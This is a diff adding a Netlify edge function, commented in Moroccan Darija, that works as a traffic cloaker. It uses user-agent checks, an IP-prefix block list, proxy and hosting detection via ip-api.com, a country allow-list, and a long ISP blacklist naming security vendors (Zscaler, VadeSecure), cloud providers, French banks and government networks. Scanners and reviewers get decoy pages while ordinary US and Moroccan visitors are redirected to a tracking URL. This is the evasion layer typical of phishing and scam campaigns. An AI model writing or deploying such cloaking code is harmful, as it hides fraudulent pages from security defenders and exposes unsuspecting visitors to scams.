@@ -1,0 +1,129 @@
+export default async (request, context) => {
+  // =====================
+  // CONFIG
+  // =====================
+  const user_url = "https://www.aucsite.com/27X9TTQ2/7M8X59F1/?creative_id=14101";
+  const allowed_countries = ['US', 'MA'];
+
+  // =====================
+  // BLACKLISTS (Men script dyalek)
+  // =====================
+  const black_list = [
+    "Quality Technology", "U.s.next", "Longwood Medical", "Fastly", "Code 200", 
+    "Netease", "Snmp Research", "Ifworld", "Royell Communications", "Penteledata", 
+    "Level 3 Parent", "Oakland Schools", "Smithville Digital", "Cleardocks", "Indonesia Online", 
+    "Apple", "Zoho", "Leaseweb", "OVH", "CompleTel", "Ozone", "Herault", "Supernet", 
+    "Interveille", "hosting", "VIALIS", "LINKSIP", "SAEM", "GTT", "TELOISE", "Nexeon", 
+    "Commerciale", "CRIHAN", "ICAUNAISE", "COOPERATIVE", "NORDNET-EXT", "INFOMIL-CLTPARIS", 
+    "NORDNET", "Technologies", "cloud", "Knet", "Systeme", "Telia", "EI-TELECOM", 
+    "Interministerielle", "Security", "Metropole", "GALIANA", "CNAMTS", "Alcatraz", 
+    "Adista", "KEYYO", "Teranet", "OpenIP-Network", "CEGETEL", "DISIC-RIE", "M247", 
+    "ALTSYSNET-OCCITANET5G", "Google", "UNIMEDIA-SERVICES", "Cogent", "Netprotect", 
+    "velia.net", "NATIXIS", "Electricite", "Hub", "Labs", "Lyre", "Serveurcom", 
+    "Rezopole", "Appliwave", "Epargne", "Anexia", "Caisse", "Sewan", "Reunicable", 
+    "Axione", "Scalair", "Colt", "epargne", "caisse", "Poste", "Nerim", "Choopa", 
+    "SPIE", "Paritel", "Microsoft", "DATACENTER", "Layer", "ZSCALER", "Coaxis", 
+    "Firewall", "RENATER", "Online", "Traitement", "Dedicated", "Owentis", "Coriolis", 
+    "Zscaler", "OZN", "CNCA", "Jaguar", "Vultr", "Holdings", "LLC", "NSC-SOLUTIONS", 
+    "Backbone", "VadeSecure", "Datacamp", "Momax", "Mutuel", "FIMATEX", "NEO", "Credit", 
+    "Agricole", "PSINet", "Skylogic", "Herault-networks", "Alliance", "Connectic", 
+    "MYSTREAM", "Amazon", "GROUPAMA", "IRIS64", "Francaise", "Opentransit", 
+    "Radiotelephone", "BPCE", "Rezocean", "K-net", "SCALEWAY", "Brutele", "YouSee", 
+    "DigitalOcean", "Linode", "Hetzner", "CenturyLink", "Host Depot", "Zayo", "Akamai"
+  ];
+
+  const block_list = [
+    "204.193.", "144.208.", "134.174.", "216.98.", "103.4.", "103.129.", 
+    "135.232.", "136.143.", "142.91.", "208.80.", "12.182.", "74.202.", 
+    "204.186.", "2a04:4e41:", "17.", "35.91.", "54.149.", "72.152.", 
+    "82.22.", "192.147.", "128.119.", "128.8.", "216.11.", "134.199.", 
+    "172.68.", "172.69.", "172.70.", "172.71.", "162.158.", "108.162.", 
+    "172.64.", "141.101.", "104.16.", "104.17.", "104.18.", "104.19.",
+    "193.56.2", "92.147.12.196", "194.78", "37.201.192.242", "79.166.147.44", 
+    "85.73.24.124", "5.203.224.203", "176.167.97.91", "176.176.30", "194.206", 
+    "185.", "176.149.93", "82.120.84", "94.143.176", "185.228.2", "176.148.157", 
+    "193.57", "89.210.43.74", "62.74.15.205", "2.10.4", "92.184", "109.221", 
+    "81.169.144", "141.38.12", "94.100.133.41", "141.38.1", "212.11.224", 
+    "212.11.225", "79.141.36.131"
+  ];
+
+  // =====================
+  // GET IP & USER AGENT
+  // =====================
+  const ip = context.ip || request.headers.get("x-forwarded-for")?.split(',')[0].trim() || "127.0.0.1";
+  const userAgent = request.headers.get("user-agent") || "";
+
+  // =====================
+  // USER AGENT / BOT FILTER
+  // =====================
+  if (!userAgent || userAgent.length < 10) {
+    return Response.redirect(new URL("/indexx.html", request.url).toString(), 302);
+  }
+
+  const bad_agents = ['bot', 'crawl', 'spider', 'slurp', 'facebook', 'python', 'curl', 'wget', 'headless', 'phantom', 'selenium', 'puppeteer'];
+  if (bad_agents.some(agent => userAgent.toLowerCase().includes(agent))) {
+    return Response.redirect(new URL("/indexx.html", request.url).toString(), 302);
+  }
+
+  // =====================
+  // IP BLOCK LIST CHECK
+  // =====================
+  for (let prefix of block_list) {
+    if (ip.startsWith(prefix)) {
+      return Response.redirect(new URL("/indexx.html", request.url).toString(), 302);
+    }
+  }
+
+  // =====================
+  // GET GEO & PROXY DATA (API)
+  // =====================
+  // Netlify kay3tik l'country direct bla API, walakin 7it l'script dyalek kaykhdem b ISP w Proxy, khassna nkhdmo b API
+  try {
+    const apiRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,countryCode,isp,hosting,proxy`);
+    const data = await apiRes.json();
+
+    if (!data || data.status !== 'success') {
+      // Ila l'API ma khdamach, redirect direct l'user_url (bhal ma kaydir PHP)
+      return Response.redirect(user_url, 302);
+    }
+
+    const country = data.countryCode || 'XX';
+    const isp = data.isp || 'Unknown';
+    const is_hosting = data.hosting || false;
+    const is_proxy = data.proxy || false;
+
+    // =====================
+    // BLOCK ALL PROXY / HOSTING / VPN
+    // =====================
+    if (is_proxy || is_hosting) {
+      return Response.redirect(new URL("/indexx.html", request.url).toString(), 302);
+    }
+
+    // =====================
+    // COUNTRY CHECK (GB, US, MA ONLY)
+    // =====================
+    if (!allowed_countries.includes(country)) {
+      return Response.redirect(new URL("/indexo.html", request.url).toString(), 302);
+    }
+
+    // =====================
+    // ISP BLACKLIST
+    // =====================
+    for (let item of black_list) {
+      if (isp.toLowerCase().includes(item.toLowerCase())) {
+        return Response.redirect(new URL("/indexx.html", request.url).toString(), 302);
+      }
+    }
+
+  } catch (error) {
+    // Ila kayn chi error f l'API, khellih ykemmel l'user_url
+    return Response.redirect(user_url, 302);
+  }
+
+  // =====================
+  // ALLOWED
+  // =====================
+  return Response.redirect(user_url, 302);
+};
+
+export const config = { path: "/*" };
